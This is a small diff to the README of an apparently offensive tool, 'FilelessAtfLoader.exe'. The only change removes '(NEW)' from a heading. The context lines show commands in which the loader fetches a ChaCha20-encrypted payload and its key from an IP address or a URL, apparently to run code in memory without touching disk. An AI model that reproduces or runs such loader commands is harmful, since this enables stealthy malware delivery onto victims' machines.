@@ -33,7 +33,7 @@ FilelessAtfLoader.exe 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin
 FilelessAtfLoader.exe 192.168.1.100 8080 /cipher.bin /key.bin
 ```
 
-## **Mode 2: Full URLs (NEW)**
+## **Mode 2: Full URLs**
 ```bash
 # ChaCha20
 FilelessAtfLoader.exe https://myserver.com/cipher_chacha20.bin https://myserver.com/key_chacha20.bin
